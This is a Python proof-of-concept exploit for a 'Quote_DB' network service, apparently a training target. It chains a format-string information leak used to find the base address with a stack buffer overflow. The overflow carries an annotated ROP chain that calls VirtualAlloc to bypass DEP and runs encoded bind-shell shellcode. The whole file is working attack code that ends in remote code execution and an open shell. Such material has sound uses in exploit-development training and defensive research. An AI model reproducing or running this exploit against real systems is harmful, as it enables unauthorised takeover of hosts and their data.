#!/usr/bin/python3

# Quote_DB PoC
# William Moody, 07.06.2021

from functools import update_wrapper
import socket
import sys
from struct import pack, unpack

if len(sys.argv) != 2:
    print("Usage: %s server" % sys.argv[0])
    sys.exit(1)

server = sys.argv[1]
port = 3700

# ===

def send(opcode, data):
    buf  = pack("<I", opcode)
    buf += data

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    
    try:
        ret = s.recv(16384)
        s.close()

        return ret
    except:
        return None

# ===

def get_quote(index):
    return send(901, pack("<I", index))

def add_quote(quote):
    return send(902, quote)

def bad_request(buf):
    return send(800, buf)

# ===

print("[+] Getting base address...")

quote_id = unpack("<I", add_quote(b"%x " * 30))[0]
base_str = get_quote(quote_id).split(b" ")[2].decode()
base = (int(base_str, 16) // 0x10000) * 0x10000

print("    -- " + hex(base))

# ===

size = 5000
ropSize = 500

# ===

# bind shell
shellcode =  b""
shellcode += b"\x90" * 20
shellcode += b"\xb8\x3b\xcc\xbe\xaa\xdb\xd2\xd9\x74\x24\xf4\x5b\x33"
shellcode += b"\xc9\xb1\x53\x31\x43\x12\x83\xc3\x04\x03\x78\xc2\x5c"
shellcode += b"\x5f\x82\x32\x22\xa0\x7a\xc3\x43\x28\x9f\xf2\x43\x4e"
shellcode += b"\xd4\xa5\x73\x04\xb8\x49\xff\x48\x28\xd9\x8d\x44\x5f"
shellcode += b"\x6a\x3b\xb3\x6e\x6b\x10\x87\xf1\xef\x6b\xd4\xd1\xce"
shellcode += b"\xa3\x29\x10\x16\xd9\xc0\x40\xcf\x95\x77\x74\x64\xe3"
shellcode += b"\x4b\xff\x36\xe5\xcb\x1c\x8e\x04\xfd\xb3\x84\x5e\xdd"
shellcode += b"\x32\x48\xeb\x54\x2c\x8d\xd6\x2f\xc7\x65\xac\xb1\x01"
shellcode += b"\xb4\x4d\x1d\x6c\x78\xbc\x5f\xa9\xbf\x5f\x2a\xc3\xc3"
shellcode += b"\xe2\x2d\x10\xb9\x38\xbb\x82\x19\xca\x1b\x6e\x9b\x1f"
shellcode += b"\xfd\xe5\x97\xd4\x89\xa1\xbb\xeb\x5e\xda\xc0\x60\x61"
shellcode += b"\x0c\x41\x32\x46\x88\x09\xe0\xe7\x89\xf7\x47\x17\xc9"
shellcode += b"\x57\x37\xbd\x82\x7a\x2c\xcc\xc9\x12\x81\xfd\xf1\xe2"
shellcode += b"\x8d\x76\x82\xd0\x12\x2d\x0c\x59\xda\xeb\xcb\x9e\xf1"
shellcode += b"\x4c\x43\x61\xfa\xac\x4a\xa6\xae\xfc\xe4\x0f\xcf\x96"
shellcode += b"\xf4\xb0\x1a\x02\xfc\x17\xf5\x31\x01\xe7\xa5\xf5\xa9"
shellcode += b"\x80\xaf\xf9\x96\xb1\xcf\xd3\xbf\x5a\x32\xdc\xae\xc6"
shellcode += b"\xbb\x3a\xba\xe6\xed\x95\x52\xc5\xc9\x2d\xc5\x36\x38"
shellcode += b"\x06\x61\x7e\x2a\x91\x8e\x7f\x78\xb5\x18\xf4\x6f\x01"
shellcode += b"\x39\x0b\xba\x21\x2e\x9c\x30\xa0\x1d\x3c\x44\xe9\xf5"
shellcode += b"\xdd\xd7\x76\x05\xab\xcb\x20\x52\xfc\x3a\x39\x36\x10"
shellcode += b"\x64\x93\x24\xe9\xf0\xdc\xec\x36\xc1\xe3\xed\xbb\x7d"
shellcode += b"\xc0\xfd\x05\x7d\x4c\xa9\xd9\x28\x1a\x07\x9c\x82\xec"
shellcode += b"\xf1\x76\x78\xa7\x95\x0f\xb2\x78\xe3\x0f\x9f\x0e\x0b"
shellcode += b"\xa1\x76\x57\x34\x0e\x1f\x5f\x4d\x72\xbf\xa0\x84\x36"
shellcode += b"\xcf\xea\x84\x1f\x58\xb3\x5d\x22\x05\x44\x88\x61\x30"
shellcode += b"\xc7\x38\x1a\xc7\xd7\x49\x1f\x83\x5f\xa2\x6d\x9c\x35"
shellcode += b"\xc4\xc2\x9d\x1f"

# ===

rop = [
# 1. Get ESP (in eax)
    0x402260,       # xor eax, eax ; ret
                    # Sets EAX to 0

    0x401fd6,       # or eax, esp ; ret
                    # Sets EAX to the value of ESP

                    # Results: EAX contains the value of stack pointer (ESP)

# 2. Get dummy call addr (in ebx)
    0x403048,       # pop ecx ; ret
                    # EAX has the value of saved ESP.
    0x1ec,          # EAX(ESP) + 0x1ec = skeleton value 'aaaa'
                    # 'aaaa' = 0x010d78cc  (0x61616161)


    0x40e8fd,       # mov edx, eax ; mov edx, eax ; ret
                    # Moves EAX(ESP) to EDX.
                    # Reason: To add ECX to EDX to manipulate saved ESP

    0x401ff3,       # add edx, ecx ; ret
    0x402c58,       # mov eax, edx
                    # Return saved ESP in EDX to EAX

    0x401fe0,       # mov ebx, eax ; ret
                    # Saved ESP is now in EBX also.

# 3. Deref virtualAlloc (in eax)
    0x403047,       # pop eax ; pop ecx ; ret
                    # Place VirtualAlloc into EAX
    0x44a1e8,       # base + iat + virtualalloc = 0x0044a1e8 (0x75ac81b0) KERNEL32!VirtualAllocStub
    0xffffffff,     # junk for pop ecx

    0x410335,       # mov eax, [eax] ; ret
                    # Derefernces the address in EAX to get the actual function pointer
                    # of VirtualAlloc.

                    # Before instruction: EAX contains 0x0044a1e8
                    # During instruction: CPU reads the value within 0x0044a1e8
                    # After  instruction: The value 0x75ac81b0 (KERNEL32!VirtualAllocStub)
                    #                     is moved into the EAX register.

# 4. Write virtual alloc to dummy
    0x401fe7,       # mov [ebx], eax ; ret
                    # Move VirtualAlloc Pointer into EBX. (Skeleton location 0x61616161)

# 5. Get shellcode addr (in eax)
    0x403048,       # pop ecx ; ret
    0x18,           # ecx = 0x18

    0x401ff3,       # add edx, ecx ; ret
                    # Adds 0x18 to EDX (which contains original skeleton call)
                    # EDX now points to shellcode address parameter

    0x402c58,       # mov eax, edx
                    # EDX moves shellcode address parameter address to EAX

                    # Result: EAX contains the address of the shellcode
                    #         EBX points to skeleton call address. (0x61616161 = 0x75ac81b0)


# 6. Get dummy call addr + 0x4 (in ebx)
    0x401fef,       # add ebx, 0x4 ; ret
                    # Result: EBX is on skeleton call + 4 (0x62626262)

# 7. Write shellcode addr to dummy + 0x4
    0x401fe7,       # mov [ebx], eax ; ret
                    # Results: Shellcode is written to 0x62626262

# 8. Get dummy call addr + 0x8 (in ebx)
    0x401fef,       # add ebx, 0x4 ; ret
                    # Results: EBX is on skeleton call + 8 (0x63636363)

# 9. Write shellcode addr to dummy + 0x8
    0x401fe7,       # mov [ebx], eax ; ret
                    # Results: Shellcode is writen to 0x63636363
                    #          Skeleton finished, we replaced all placeholders with values
                    #          to execute VirtualAlloc()
                    # VirtualAllocStub (764081b0)
                    #   ESP         = Shellcode Address (0x010a78e4)
                    #   lpAddress   = Shellcode Address (0x010a78e4)
                    #   dwSize      = 0x200
                    #   AllocType   = 0x1000
                    #   flProtect   = 0x40

# 10. Align esp with dummy call (ebx-8)
    0x403048,       # pop ecx
    0xffffffe8,     # 0xffffffe8    = -0x18 (-24)
    0x401ff3,       # add edx, ecx  = edx - 0x24
    0x402c58,       # mov eax, edx
    0x40ee19,       # xchg eax, esp

                    # Results: Return SAVED ESP from EAX to CURRENT ESP

]
rop = b"".join([pack("<I", r) for r in rop])

# ===

dummy  = b"aaaa" # VirtualAlloc
dummy += b"bbbb" # return <- shellcode addr
dummy += b"cccc" # lpAddress <- shellcode addr
dummy += pack("<I", 0x200) # dwSize <- 0x1
dummy += pack("<I", 0x1000) # flAllocationType <- 0x1000
dummy += pack("<I", 0x40) # flProtect <- 0x40

# ===

buf  = b"A" * 2060
buf += rop
buf += b"C" * (ropSize - len(rop))
buf += dummy
buf += shellcode

# ===

print("[+] Triggering overflow...")

bad_request(buf)
